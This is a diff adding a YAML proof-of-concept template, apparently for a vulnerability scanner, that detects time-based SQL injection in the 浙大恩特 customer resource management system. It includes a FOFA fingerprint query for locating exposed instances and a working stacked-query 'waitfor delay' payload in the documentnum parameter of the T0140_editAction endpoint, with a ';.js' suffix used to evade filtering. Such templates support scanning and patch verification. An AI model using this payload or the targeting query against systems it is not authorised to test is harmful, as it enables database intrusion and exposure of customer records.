@@ -1,0 +1,16 @@
+id: poc-yaml-zhe-da-en-te-customer-resource-management-system-t0140-editaction-sqli
+info:
+  name: 浙大恩特客户资源管理系统 T0140_editAction SQL漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1%27;waitfor+delay+%270:0:{{.t1}}%27--
+  expression: status_code == 200 && body == 0 && duration > t1
+transport: http
